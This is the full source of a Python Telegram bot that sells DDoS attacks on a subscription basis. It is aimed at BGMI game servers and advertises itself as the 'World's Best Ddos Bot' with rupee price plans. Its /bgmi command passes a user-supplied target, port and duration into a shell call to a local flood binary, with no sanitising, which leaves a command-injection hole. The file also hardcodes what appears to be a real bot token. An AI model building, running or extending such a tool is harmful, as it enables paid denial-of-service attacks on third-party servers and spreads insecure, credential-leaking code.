#!/usr/bin/python3
#ZAHER (@Hi_cheat1)

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7248601249:AAHCcvqi4fAkddlGJMnJBpiEpYn70FH0Iec')

# Admin user IDs
admin_id = ["881808734",]

# Files to store user data
USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read subscriptions from the file
def read_subscriptions():
    subscriptions = {}
    try:
        with open(SUBSCRIPTION_FILE, "r") as file:
            for line in file.read().splitlines():
                user_id, end_date = line.split()
                subscriptions[user_id] = datetime.datetime.strptime(end_date, "%Y-%m-%d")
    except FileNotFoundError:
        pass
    return subscriptions

# List to store allowed user IDs
allowed_user_ids = read_users()

# Dictionary to store user subscriptions
subscriptions = read_subscriptions()

# Function to save subscriptions to the file
def save_subscriptions():
    with open(SUBSCRIPTION_FILE, "w") as file:
        for user_id, end_date in subscriptions.items():
            file.write(f"{user_id} {end_date.strftime('%Y-%m-%d')}\n")

# Function to check if a user has an active subscription
def has_active_subscription(user_id):
    if user_id in subscriptions:
        return subscriptions[user_id] >= datetime.datetime.now()
    return False

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "🗑️Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦."
        else:
            response = "Please specify a user ID to add 🧐."
    else:
        response = "🫅Only Admin Can Run This Command🫅."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove👇. 
 Usage: /remove <userid>'''
    else:
        response = "🫅Only Admin Can Run This Command🫅."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "🫅Only Admin Can Run This Command🫅."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "🫅Only Admin Can Run This Command🫅."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "🫅Only Admin Can Run This Command🫅."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🙍{username}, 🚀𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🚀 .\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🚪𝐏𝐨𝐫𝐭: {port}\n⏳𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n🛡️𝐌𝐞𝐭𝐡𝐨𝐝: BGMI-VIP\n@Hi_cheat1"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if not has_active_subscription(user_id):
            bot.reply_to(message, "❌Your subscription has expired. Please contact an admin to renew❌")
            return
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 180:
                response = "❄️You Are On Cooldown. Please Wait 3min Before Running The /bgmi Command Again❄️"
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 300:
                response = "⚠️Error: Time interval must be less than 300⚠️."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 600"
                subprocess.run(full_command, shell=True)
                response = f" 🎮BGMI Attack Finished! 🎮.\n\n🎯Target: {target}\n🚪Port: {port}\n⏳Time: {time}"
        else:
            response = "✅Usage :- /bgmi <target> <port> <time>\n@Hi_cheat1"
    else:
        response = "🚫You Are Not Authorized To Use This Command🚫.\n@Hi_cheat1"

    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "📜Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "📜No Command Logs Found For You."
        except FileNotFoundError:
            response = "📜No command logs found."
    else:
        response = "🚫You Are Not Authorized To Use This Command🚫."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''💥Available commands💥:
 💥 /bgmi : Method For Bgmi Servers. 💥
 💥 /rules : Please Check Before Use !!.💥
 💥 /mylogs : To Check Your Recents Attacks.💥
 💥 /plan : Checkout Our Botnet Rates.💥

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 @Hi_cheat1
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"🎉Welcome to Your Home, {user_name}!🎉 \nFeel Free to Explore.Try To Run This Command : /help\n\n🎊Welcome To The World's Best Ddos Bot🤖\n@Hi_cheat1"
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''📜{user_name} Please Follow These Rules📜:

1. 🚫Dont Run Too Many Attacks !! Cause A Ban From Bot
2. ⚠️Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. 🧐We Daily Checks The Logs So Follow these rules to avoid Ban!!
@Hi_cheat1'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''🌐{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos🌐 !!:

Vip :
-> ⏳Attack Time : 300 (S)
-> 🕐After Attack Limit : 3 Min
-> 💣Concurrents Attack : 300

💸Price List:
1️⃣Day-->200 Rs
1️⃣Week-->900 Rs
1️⃣Month-->1600 Rs
@Hi_cheat1
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_admincmd(message):
    user_name = message.from_user.first_name
    response = f'''🫅{user_name}, Admin Commands Are Here!!🫅:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
/startsub <userId> <days> : Start a subscription for a user.
/endsub <userId> : End a user's subscription.
@Hi_cheat1
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "📢Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "📢Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message📜 To Broadcast."
    else:
        response = "🚫Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['startsub'])
def start_subscription(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_subscribe = command[1]
            days = int(command[2])
            end_date = datetime.datetime.now() + datetime.timedelta(days=days)
            subscriptions[user_to_subscribe] = end_date
            save_subscriptions()
            response = f"Subscription for user {user_to_subscribe} started for {days} days, ending on {end_date.strftime('%Y-%m-%d')}."
        else:
            response = "Usage: /startsub <userId> <days>"
    else:
        response = "🚫Only Admin Can Run This Command."

    bot.reply_to(message, response)

@bot.message_handler(commands=['endsub'])
def end_subscription(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_unsubscribe = command[1]
            if user_to_unsubscribe in subscriptions:
                del subscriptions[user_to_unsubscribe]
                save_subscriptions()
                response = f"Subscription for user {user_to_unsubscribe} ended."
            else:
                response = f"❌No active subscription found for user {user_to_unsubscribe}."
        else:
            response = "Usage: /endsub <userId>"
    else:
        response = "🚫Only Admin Can Run This Command."

    bot.reply_to(message, response)

bot.polling()
#@Hi_cheat1

                
